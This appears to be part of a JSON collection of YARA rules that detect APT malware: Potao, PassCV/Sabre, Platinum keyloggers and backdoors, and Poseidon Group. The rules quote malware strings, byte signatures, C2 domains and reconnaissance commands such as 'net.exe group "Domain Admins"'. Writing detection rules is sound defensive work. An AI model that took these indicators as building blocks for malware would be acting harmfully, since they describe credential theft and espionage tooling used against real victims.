  "PotaoUSB": "rule PotaoUSB\n{\n\n    strings:\n        $mz = { 4d 5a } \n        $binary1 = { 33 C0 8B C8 83 E1 03 BA ?? ?? ?? 00 2B D1 8A 0A 32 88 ?? ?? ?? 00 2A C8 FE C9 88 88 ?? ?? ?? 00 40 3D ?? ?? 00 00 7C DA C3 }\n        $binary2 = { 55 8B EC 51 56 C7 45 FC 00 00 00 00 EB 09 8B 45 FC 83 C0 01 89 45 FC 81 7D FC ?? ?? 00 00 7D 3D 8B 4D FC 0F BE 89 ?? ?? ?? 00 8B 45 FC 33 D2 BE 04 00 00 00 F7 F6 B8 03 00 00 00 2B C2 0F BE 90 ?? ?? ?? 00 33 CA 2B 4D FC 83 E9 01 81 E1 FF 00 00 00 8B 45 FC 88 88 ?? ?? ?? 00 EB B1 5E 8B E5 5D C3}\n    condition:\n        ($mz at 0) and any of ($binary*)\n}",
  "PotaoSecondStage": "rule PotaoSecondStage\n{\n\n    strings:\n        $mz = { 4d 5a }\n        // hash of CryptBinaryToStringA and CryptStringToBinaryA\n        $binary1 = {51 7A BB 85 [10-180] E8 47 D2 A8}\n        // old hash of CryptBinaryToStringA and CryptStringToBinaryA\n        $binary2 = {5F 21 63 DD [10-30] EC FD 33 02}\n        $binary3 = {CA 77 67 57 [10-30] BA 08 20 7A}        \n        $str1 = \"?AVCrypt32Import@@\"\n        $str2 = \"%.5llx\"\n    \n    condition:\n        ($mz at 0) and any of ($binary*) and any of ($str*)\n}",
  "Potao": "rule Potao\n{\n\n    meta:\n        Author      = \"Anton Cherepanov\"\n        Date        = \"2015/07/29\"\n        Description = \"Operation Potao\"\n        Reference   = \"http://www.welivesecurity.com/wp-content/uploads/2015/07/Operation-Potao-Express_final_v2.pdf\"\n        Source = \"https://github.com/eset/malware-ioc/\"\n        Contact = \"threatintel@eset.com\"\n        License = \"BSD 2-Clause\"\n    \n    condition:\n        PotaoDecoy or PotaoDll or PotaoUSB or PotaoSecondStage\n}",
  "backdoor_apt_pcclient": "rule backdoor_apt_pcclient\n{\n\n    meta:\n        author = \"@patrickrolsen\"\n        maltype = \"APT.PCCLient\"\n        filetype = \"DLL\"\n        version = \"0.1\"\n        description = \"Detects the dropper: 869fa4dfdbabfabe87d334f85ddda234 AKA dw20.dll/msacm32.drv dropped by 4a85af37de44daf5917f545c6fd03902 (RTF)\"\n        date = \"2012-10\"\n\n    strings:\n        $magic = { 4d 5a } // MZ\n        $string1 = \"www.micro1.zyns.com\"\n        $string2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Win32)\"\n        $string3 = \"msacm32.drv\" wide\n        $string4 = \"C:\\\\Windows\\\\Explorer.exe\" wide\n        $string5 = \"Elevation:Administrator!\" wide\n        $string6 = \"C:\\\\Users\\\\cmd\\\\Desktop\\\\msacm32\\\\Release\\\\msacm32.pdb\"\n\n    condition:\n        $magic at 0 and 4 of ($string*)\n}",
  "PassCV_Sabre_Malware_1": "rule PassCV_Sabre_Malware_1 \n{\n\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20\"\n      hash1 = \"24a9bfbff81615a42e42755711c8d04f359f3bf815fb338022edca860ff1908a\"\n      hash2 = \"e61e56b8f2666b9e605127b4fcc7dc23871c1ae25aa0a4ea23b48c9de35d5f55\"\n\n   strings:\n      $x1 = \"F:\\\\Excalibur\\\\Excalibur\\\\Excalibur\\\\\" ascii\n      $x2 = \"bin\\\\oSaberSvc.pdb\" ascii\n      $s1 = \"cmd.exe /c MD \" fullword ascii\n      $s2 = \"https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=0&rsv_idx=1&tn=baidu&wd=ip138\" fullword wide\n      $s3 = \"CloudRun.exe\" fullword wide\n      $s4 = \"SaberSvcB.exe\" fullword wide\n      $s5 = \"SaberSvc.exe\" fullword wide\n      $s6 = \"SaberSvcW.exe\" fullword wide\n      $s7 = \"tianshiyed@iaomaomark1#23mark123tokenmarkqwebjiuga664115\" fullword wide\n      $s8 = \"Internet Connect Failed!\" fullword ascii\n\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 1 of ($x*) and 5 of ($s*) ) ) or ( all of them )\n}",
  "PassCV_Sabre_Malware_Signing_Cert": "rule PassCV_Sabre_Malware_Signing_Cert \n{\n\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20\"\n      score = 50\n      hash1 = \"7c32885c258a6d5be37ebe83643f00165da3ebf963471503909781540204752e\"\n\n   strings:\n      $s1 = \"WOODTALE TECHNOLOGY INC\" ascii\n      $s2 = \"Flyingbird Technology Limited\" ascii\n      $s3 = \"Neoact Co., Ltd.\" ascii\n      $s4 = \"AmazGame Age Internet Technology Co., Ltd\" ascii\n      $s5 = \"EMG Technology Limited\" ascii\n      $s6 = \"Zemi Interactive Co., Ltd\" ascii\n      $s7 = \"337 Technology Limited\" ascii\n      $s8 = \"Runewaker Entertainment0\" fullword ascii\n\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them )\n}",
  "PassCV_Sabre_Malware_2": "rule PassCV_Sabre_Malware_2 \n{\n\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20\"\n      hash1 = \"475d1c2d36b2cf28b28b202ada78168e7482a98b42ff980bbb2f65c6483db5b4\"\n      hash2 = \"009645c628e719fad2e280ef60bbd8e49bf057196ac09b3f70065f1ad2df9b78\"\n      hash3 = \"92479c7503393fc4b8dd7c5cd1d3479a182abca3cda21943279c68a8eef9c64b\"\n      hash4 = \"0c7b952c64db7add5b8b50b1199fc7d82e9b6ac07193d9ec30e5b8d353b1f6d2\"\n\n   strings:\n      $x1 = \"ncProxyXll\" fullword ascii\n      $s1 = \"Uniscribe.dll\" fullword ascii\n      $s2 = \"WS2_32.dll\" ascii\n      $s3 = \"ProxyDll\" fullword ascii\n      $s4 = \"JDNSAPI.dll\" fullword ascii\n      $s5 = \"x64.dat\" fullword ascii\n      $s6 = \"LSpyb2\" fullword ascii\n\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 4000KB and $x1 ) or ( all of them )\n}",
  "PassCV_Sabre_Malware_Excalibur_1": "rule PassCV_Sabre_Malware_Excalibur_1\n{\n\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20\"\n      hash1 = \"21566f5ff7d46cc9256dae8bc7e4c57f2b9261f95f6ad2ac921558582ea50dfb\"\n      hash2 = \"02922c5d994e81629d650be2a00507ec5ca221a501fe3827b5ed03b4d9f4fb70\"\n\n   strings:\n      $x1 = \"F:\\\\Excalibur\\\\Excalibur\\\\\" ascii\n      $x2 = \"Excalibur\\\\bin\\\\Shell.pdb\" ascii\n      $x3 = \"SaberSvc.exe\" wide\n      $s1 = \"BBB.exe\" fullword wide\n      $s2 = \"AAA.exe\" fullword wide\n   \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of ($x*) or all of ($s*) ) or 3 of them\n}",
  "PassCV_Sabre_Malware_3": "rule PassCV_Sabre_Malware_3 \n{\n\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20\"\n      hash1 = \"28c7575b2368a9b58d0d1bf22257c4811bd3c212bd606afc7e65904041c29ce1\"\n\n   strings:\n      $x1 = \"NXKILL\" fullword wide\n      $s1 = \"2OLE32.DLL\" fullword ascii\n      $s2 = \"localspn.dll\" fullword wide\n      $s3 = \"!This is a Win32 program.\" fullword ascii\n   \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 8000KB and $x1 and 2 of ($s*) )\n}",
  "PassCV_Sabre_Malware_4": "rule PassCV_Sabre_Malware_4 \n{\n\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20\"\n      hash1 = \"27463bcb4301f0fdd95bc10bf67f9049e161a4e51425dac87949387c54c9167f\"\n\n   strings:\n      $s1 = \"QWNjZXB0On\" fullword ascii /* base64 encoded string 'Accept:' */\n      $s2 = \"VXNlci1BZ2VudDogT\" fullword ascii /* b64: User-Agent: */\n      $s3 = \"dGFzay5kbnME3luLmN\" fullword ascii /* b64: task.dns\u0004[ */\n\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )\n}",
  "PassCV_Sabre_Tool_NTScan": "rule PassCV_Sabre_Tool_NTScan \n{\n\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20\"\n      hash1 = \"0f290612b26349a551a148304a0bd3b0d0651e9563425d7c362f30bd492d8665\"\n\n   strings:\n      $x1 = \"NTscan.EXE\" fullword wide\n      $x2 = \"NTscan Microsoft \" fullword wide\n      $s1 = \"admin$\" fullword ascii\n   \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and 2 of them )\n}",
  "PassCV_Sabre_Malware_5": "rule PassCV_Sabre_Malware_5 \n{\n\n   meta:\n      description = \"PassCV Malware mentioned in Cylance Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n      date = \"2016-10-20\"\n      hash1 = \"03aafc5f468a84f7dd7d7d38f91ff17ef1ca044e5f5e8bbdfe589f5509b46ae5\"\n  \n   strings:\n      $x1 = \"ncircTMPg\" fullword ascii\n      $x2 = \"~SHELL#\" fullword ascii\n      $x3 = \"N.adobe.xm\" fullword ascii\n      $s1 = \"NEL32.DLL\" fullword ascii\n      $s2 = \"BitLocker.exe\" fullword wide\n      $s3 = \"|xtplhd\" fullword ascii /* reversed goodware string 'dhlptx|' */\n      $s4 = \"SERVICECORE\" fullword wide\n      $s5 = \"SHARECONTROL\" fullword wide\n   \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 4000KB and 1 of ($x*) or all of ($s*) )\n}",
  "APT_Win_Pipcreat": "rule APT_Win_Pipcreat \n{ \n\n  meta: \n    author = \"chort (@chort0)\"\n    description = \"APT backdoor Pipcreat\"\n    filetype = \"pe,dll\" \n    date = \"2013-03\"\n    MD5 = \"f09d832bea93cf320986b53fce4b8397\" // (incorrectly?) identified as Hupigon by many AV on VT \n    Reference = \"http://www.cyberengineeringservices.com/login-exe-analysis-trojan-pipcreat/\"\n    version = \"1.0\"\n\n  strings: \n    $strA = \"pip creat failed\" wide fullword \n    $strB = \"CraatePipe\" ascii fullword \n    $strC = \"are you there? \" wide fullword \n    $strD = \"success kill process ok\" wide fullword \n    $strE = \"Vista|08|Win7\" wide fullword \n    $rut = \"are you there!@#$%^&*()_+\" ascii fullword \n    \n  condition: \n    $rut or (2 of ($str*)) \n  }",
  "Trojan_Win32_PlaSrv": "rule Trojan_Win32_PlaSrv\n{\n\nmeta:\n    author = \"Microsoft\"\n    description = \"Hotpatching Injector\"\n    original_sample_sha1 = \"ff7f949da665ba8ce9fb01da357b51415634eaad\"\n    unpacked_sample_sha1 = \"dff2fee984ba9f5a8f5d97582c83fca4fa1fe131\"\n    activity_group = \"Platinum\"\n    version = \"1.0\"\n    last_modified = \"2016-04-12\"\n\nstrings:\n    $Section_name = \".hotp1\"\n    $offset_x59 = { C7 80 64 01 00 00 00 00 01 00 }\n\ncondition:\n    $Section_name and $offset_x59\n}",
  "Trojan_Win32_Platual": "rule Trojan_Win32_Platual\n{\n\nmeta:\n    author = \"Microsoft\"\n    description = \"Installer component\"\n    original_sample_sha1 = \"e0ac2ae221328313a7eee33e9be0924c46e2beb9\"\n    unpacked_sample_sha1 = \"ccaf36c2d02c3c5ca24eeeb7b1eae7742a23a86a\"\n    activity_group = \"Platinum\"\n    version = \"1.0\"\n    last_modified = \"2016-04-12\"\n\nstrings:\n    $class_name = \"AVCObfuscation\"\n    $scrambled_dir = { A8 8B B8 E3 B1 D7 FE 85 51 32 3E C0 F1 B7 73 99 }\n\ncondition:\n    $class_name and $scrambled_dir\n}",
  "Trojan_Win32_Plaplex": "rule Trojan_Win32_Plaplex \n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Variant of the JPin backdoor\"\n        original_sample_sha1 = \"ca3bda30a3cdc15afb78e54fa1bbb9300d268d66\"\n        unpacked_sample_sha1 = \"2fe3c80e98bbb0cf5a0c4da286cd48ec78130a24\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $class_name1 = \"AVCObfuscation\"\n        $class_name2 = \"AVCSetiriControl\"\n    \n    condition:\n        $class_name1 and $class_name2\n}",
  "Trojan_Win32_Dipsind_B": "rule Trojan_Win32_Dipsind_B\n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Dipsind Family\"\n        sample_sha1 = \"09e0dfbb5543c708c0dd6a89fd22bbb96dc4ca1c\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $frg1 = {8D 90 04 01 00 00 33 C0 F2 AE F7 D1 2B F9 8B C1 8B F7 8B FA C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 4D EC 8B 15 ?? ?? ?? ?? 89 91 ?? 07 00 00 }\n        $frg2 = {68 A1 86 01 00 C1 E9 02 F3 AB 8B CA 83 E1 03 F3 AA}\n        $frg3 = {C0 E8 07 D0 E1 0A C1 8A C8 32 D0 C0 E9 07 D0 E0 0A C8 32 CA 80 F1 63}\n    \n    condition:\n        $frg1 and $frg2 and $frg3\n}",
  "Trojan_Win32_PlaKeylog_B": "rule Trojan_Win32_PlaKeylog_B\n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Keylogger component\"\n        original_sample_sha1 = \"0096a3e0c97b85ca75164f48230ae530c94a2b77\"\n        unpacked_sample_sha1 = \"6a1412daaa9bdc553689537df0a004d44f8a45fd\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $hook = {C6 06 FF 46 C6 06 25}\n        $dasm_engine = {80 C9 10 88 0E 8A CA 80 E1 07 43 88 56 03 80 F9 05}\n    \n    condition:\n        $hook and $dasm_engine\n}",
  "Trojan_Win32_Adupib": "rule Trojan_Win32_Adupib \n{\n    \n    meta:\n        author = \"Microsoft\"\n        description = \"Adupib SSL Backdoor\"\n        original_sample_sha1 = \"d3ad0933e1b114b14c2b3a2c59d7f8a95ea0bcbd\"\n        unpacked_sample_sha1 = \"a80051d5ae124fd9e5cc03e699dd91c2b373978b\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = \"POLL_RATE\"\n        $str2 = \"OP_TIME(end hour)\"\n        $str3 = \"%d:TCP:*:Enabled\"\n        $str4 = \"%s[PwFF_cfg%d]\"\n        $str5 = \"Fake_GetDlgItemTextW: ***value***=\"\n\n    condition:\n        $str1 and $str2 and $str3 and $str4 and $str5\n}",
  "Trojan_Win32_PlaLsaLog": "rule Trojan_Win32_PlaLsaLog \n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Loader / possible incomplete LSA Password Filter\"\n        original_sample_sha1 = \"fa087986697e4117c394c9a58cb9f316b2d9f7d8\"\n        unpacked_sample_sha1 = \"29cb81dbe491143b2f8b67beaeae6557d8944ab4\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = {8A 1C 01 32 DA 88 1C 01 8B 74 24 0C 41 3B CE 7C EF 5B 5F C6 04 01 00 5E 81 C4 04 01 00 00 C3}\n        $str2 = \"PasswordChangeNotify\"\n\n    condition:\n        $str1 and $str2\n}",
  "Trojan_Win32_Plagon": "rule Trojan_Win32_Plagon\n{\n   \n    meta:\n        author = \"Microsoft\"\n        description = \"Dipsind variant\"\n        original_sample_sha1 = \"48b89f61d58b57dba6a0ca857bce97bab636af65\"\n        unpacked_sample_sha1 = \"6dccf88d89ad7b8611b1bc2e9fb8baea41bdb65a\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = \"VPLRXZHTU\"\n        $str2 = {64 6F 67 32 6A 7E 6C}\n        $str3 = \"Dqpqftk(Wou\\\"Isztk)\"\n        $str4 = \"StartThreadAtWinLogon\"\n        condition:\n        $str1 and $str2 and $str3 and $str4\n}",
  "Trojan_Win32_Plakelog": "rule Trojan_Win32_Plakelog \n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Raw-input based keylogger\"\n        original_sample_sha1 = \"3907a9e41df805f912f821a47031164b6636bd04\"\n        unpacked_sample_sha1 = \"960feeb15a0939ec0b53dcb6815adbf7ac1e7bb2\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = \"<0x02>\" wide\n        $str2 = \"[CTR-BRK]\" wide\n        $str3 = \"[/WIN]\" wide\n        $str4 = {8A 16 8A 18 32 DA 46 88 18 8B 15 08 E6 42 00 40 41 3B CA 72 EB 5E 5B}\n\n    condition:\n        $str1 and $str2 and $str3 and $str4\n}",
  "Trojan_Win32_Plainst": "rule Trojan_Win32_Plainst\n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Installer component\"\n        original_sample_sha1 = \"99c08d31af211a0e17f92dd312ec7ca2b9469ecb\"\n        unpacked_sample_sha1 = \"dcb6cf7cf7c8fdfc89656a042f81136bda354ba6\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = {66 8B 14 4D 18 50 01 10 8B 45 08 66 33 14 70 46 66 89 54 77 FE 66 83 7C 77 FE 00 75 B7 8B 4D FC 89 41 08 8D 04 36 89 41 0C 89 79 04}\n        $str2 = {4b D3 91 49 A1 80 91 42 83 B6 33 28 36 6B 90 97}\n\n    condition:\n        $str1 and $str2\n}",
  "Trojan_Win32_Plagicom": "rule Trojan_Win32_Plagicom\n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Installer component\"\n        original_sample_sha1 = \"99dcb148b053f4cef6df5fa1ec5d33971a58bd1e\"\n        unpacked_sample_sha1 = \"c1c950bc6a2ad67488e675da4dfc8916831239a7\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = {C6 44 24 ?? 68 C6 44 24 ?? 4D C6 44 24 ?? 53 C6 44 24 ?? 56 C6 44 24 ?? 00}\n        $str2 = \"OUEMM/EMM\"\n        $str3 = {85 C9 7E 08 FE 0C 10 40 3B C1 7C F8 C3}\n\n    condition:\n        $str1 and $str2 and $str3\n}",
  "Trojan_Win32_Plaklog": "rule Trojan_Win32_Plaklog\n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Hook-based keylogger\"\n        original_sample_sha1 = \"831a5a29d47ab85ee3216d4e75f18d93641a9819\"\n        unpacked_sample_sha1 = \"e18750207ddbd939975466a0e01bd84e75327dda\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = \"++[%s^^unknown^^%s]++\"\n        $str2 = \"vtfs43/emm\"\n        $str3 = {33 C9 39 4C 24 08 7E 10 8B 44 24 04 03 C1 80 00 08 41 3B 4C 24 08 7C F0 C3}\n\n    condition:\n        $str1 and $str2 and $str3\n}",
  "Trojan_Win32_Plapiio": "rule Trojan_Win32_Plapiio\n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"JPin backdoor\"\n        original_sample_sha1 = \"3119de80088c52bd8097394092847cd984606c88\"\n        unpacked_sample_sha1 = \"3acb8fe2a5eb3478b4553907a571b6614eb5455c\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = \"ServiceMain\"\n        $str2 = \"Startup\"\n        $str3 = {C6 45 ?? 68 C6 45 ?? 4D C6 45 ?? 53 C6 45 ?? 56 C6 45 ?? 6D C6 45 ?? 6D}\n\n    condition:\n        $str1 and $str2 and $str3\n}",
  "Trojan_Win32_Plabit": "rule Trojan_Win32_Plabit\n{\n\n    meta:\n        author = \"Microsoft\" description = \"Installer component\" sample_sha1 = \"6d1169775a552230302131f9385135d385efd166\" activity_group = \"Platinum\" version = \"1.0\"\n        last_modified = \"2016-04-12\"\n    \n    strings:\n        $str1 = {4b D3 91 49 A1 80 91 42 83 B6 33 28 36 6B 90 97}\n        $str2 = \"GetInstanceW\"\n        $str3 = {8B D0 83 E2 1F 8A 14 0A 30 14 30 40 3B 44 24 04 72 EE}\n    \n    condition:\n        $str1 and $str2 and $str3\n}",
  "Trojan_Win32_Placisc2": "rule Trojan_Win32_Placisc2\n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Dipsind variant\"\n        original_sample_sha1 = \"bf944eb70a382bd77ee5b47548ea9a4969de0527\"\n        unpacked_sample_sha1 = \"d807648ddecc4572c7b04405f496d25700e0be6e\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = {76 16 8B D0 83 E2 07 8A 4C 14 24 8A 14 18 32 D1 88 14 18 40 3B C7 72 EA }\n        $str2 = \"VPLRXZHTU\"\n        $str3 = \"%d) Command:%s\"\n        $str4 = {0D 0A 2D 2D 2D 2D 2D 09 2D 2D 2D 2D 2D 2D 0D 0A}\n\n    condition:\n        $str1 and $str2 and $str3 and $str4\n}",
  "Trojan_Win32_Placisc3": "rule Trojan_Win32_Placisc3 \n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Dipsind variant\"\n        original_sample_sha1 = \"1b542dd0dacfcd4200879221709f5fa9683cdcda\"\n        unpacked_sample_sha1 = \"bbd4992ee3f3a3267732151636359cf94fb4575d\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = {BA 6E 00 00 00 66 89 95 ?? ?? FF FF B8 73 00 00 00 66 89 85 ?? ?? FF FF B9 64 00 00 00 66 89 8D ?? ?? FF FF BA 65 00 00 00 66 89 95 ?? ?? FF FF B8 6C 00 00 00}\n        $str2 = \"VPLRXZHTU\"\n        $str3 = {8B 44 24 ?? 8A 04 01 41 32 C2 3B CF 7C F2 88 03}\n\n    condition:\n        $str1 and $str2 and $str3\n}",
  "Trojan_Win32_Placisc4": "rule Trojan_Win32_Placisc4 \n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Installer for Dipsind variant\"\n        original_sample_sha1 = \"3d17828632e8ff1560f6094703ece5433bc69586\"\n        unpacked_sample_sha1 = \"2abb8e1e9cac24be474e4955c63108ff86d1a034\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n    \n    strings:\n        $str1 = {8D 71 01 8B C6 99 BB 0A 00 00 00 F7 FB 0F BE D2 0F BE 04 39 2B C2 88 04 39 84 C0 74 0A}\n        $str2 = {6A 04 68 00 20 00 00 68 00 00 40 00 6A 00 FF D5}\n        $str3 = {C6 44 24 ?? 64 C6 44 24 ?? 6F C6 44 24 ?? 67 C6 44 24 ?? 32 C6 44 24 ?? 6A}\n    \n    condition:\n        $str1 and $str2 and $str3\n}",
  "Trojan_Win32_Plakpers": "rule Trojan_Win32_Plakpers\n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Injector / loader component\"\n        original_sample_sha1 = \"fa083d744d278c6f4865f095cfd2feabee558056\"\n        unpacked_sample_sha1 = \"3a678b5c9c46b5b87bfcb18306ed50fadfc6372e\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = \"MyFileMappingObject\"\n        $str2 = \"[%.3u] %s %s %s [%s:\" wide\n        $str3 = \"%s\\\\{%s}\\\\%s\" wide\n\n    condition:\n        $str1 and $str2 and $str3\n}",
  "Trojan_Win32_Plainst2": "rule Trojan_Win32_Plainst2 \n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Zc tool\"\n        original_sample_sha1 = \"3f2ce812c38ff5ac3d813394291a5867e2cddcf2\"\n        unpacked_sample_sha1 = \"88ff852b1b8077ad5a19cc438afb2402462fbd1a\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = \"Connected [%s:%d]...\"\n        $str2 = \"reuse possible: %c\"\n        $str3 = \"] => %d%%\\x0a\"\n\n    condition:\n        $str1 and $str2 and $str3\n}",
  "Trojan_Win32_Plakpeer": "rule Trojan_Win32_Plakpeer\n{\n\n    meta:\n        author = \"Microsoft\"\n        description = \"Zc tool v2\"\n        original_sample_sha1 = \"2155c20483528377b5e3fde004bb604198463d29\"\n        unpacked_sample_sha1 = \"dc991ef598825daabd9e70bac92c79154363bab2\"\n        activity_group = \"Platinum\"\n        version = \"1.0\"\n        last_modified = \"2016-04-12\"\n\n    strings:\n        $str1 = \"@@E0020(%d)\" wide\n        $str2 = /exit.{0,3}@exit.{0,3}new.{0,3}query.{0,3}rcz.{0,3}scz/ wide\n        $str3 = \"---###---\" wide\n        $str4 = \"---@@@---\" wide\n\n    condition:\n        $str1 and $str2 and $str3 and $str4\n}",
  "PoseidonGroup_Malware": "rule PoseidonGroup_Malware \n{\n\n    meta:\n        description = \"Detects Poseidon Group Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/\"\n        date = \"2016-02-09\"\n        score = 85\n        hash1 = \"337e94119cfad0b3144af81b72ac3b2688a219ffa0bdf23ca56c7a68fbe0aea4\"\n        hash2 = \"344034c0bf9fcd52883dbc158abf6db687150d40a118d9cd6ebd843e186128d3\"\n        hash3 = \"432b7f7f7bf94260a58ad720f61d91ba3289bf0a9789fc0c2b7ca900788dae61\"\n        hash4 = \"8955df76182005a69f19f5421c355f1868efe65d6b9e0145625dceda94b84a47\"\n        hash5 = \"d090b1d77e91848b1e2f5690b54360bbbd7ef808d017304389b90a0f8423367f\"\n        hash6 = \"d7c8b47a0d0a9181fb993f17e165d75a6be8cf11812d3baf7cf11d085e21d4fb\"\n        hash7 = \"ded0ee29af97496f27d810f6c16d78a3031d8c2193d5d2a87355f3e3ca58f9b3\"\n\n    strings:\n        $s1 = \"c:\\\\winnt\\\\system32\\\\cmd.exe\" fullword ascii\n        $s2 = \"c:\\\\windows\\\\system32\\\\cmd.exe\" fullword ascii\n        $s3 = \"c:\\\\windows\\\\command.com\" fullword ascii\n        $s4 = \"copy \\\"%s\\\" \\\"%s\\\" /Y\" fullword ascii\n        $s5 = \"http://%s/files/\" fullword ascii\n        $s6 = \"\\\"%s\\\". %s: \\\"%s\\\".\" fullword ascii\n        $s7 = \"0x0666\" fullword ascii\n        $s8 = \"----------------This_is_a_boundary$\" fullword ascii\n        $s9 = \"Server 2012\" fullword ascii /* Goodware String - occured 1 times */\n        $s10 = \"Server 2008\" fullword ascii /* Goodware String - occured 1 times */\n        $s11 = \"Server 2003\" fullword ascii /* Goodware String - occured 1 times */\n        $a1 = \"net.exe group \\\"Domain Admins\\\" /domain\" fullword ascii\n        $a2 = \"net.exe group \\\"Admins. do Dom\" fullword ascii\n        $a3 = \"(SVRID=%d)\" fullword ascii\n        $a4 = \"(TG=%d)\" fullword ascii\n        $a5 = \"(SVR=%s)\" fullword ascii\n        $a6 = \"Set-Cookie:\\\\b*{.+?}\\\\n\" fullword wide\n        $a7 = \"net.exe localgroup Administradores\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 650KB and 6 of ($s*) ) or ( 4 of ($s*) and 1 of ($a*) )\n}",
  "PoseidonGroup_MalDoc_1": "rule PoseidonGroup_MalDoc_1 \n{\n\n    meta:\n        description = \"Detects Poseidon Group - Malicious Word Document\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/\"\n        date = \"2016-02-09\"\n        score = 80\n        hash = \"0983526d7f0640e5765ded6be6c9e64869172a02c20023f8a006396ff358999b\"\n\n    strings:\n        $s1 = \"c:\\\\cmd32dll.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0xcfd0 and filesize < 500KB and all of them\n}",
  "PoseidonGroup_MalDoc_2": "",
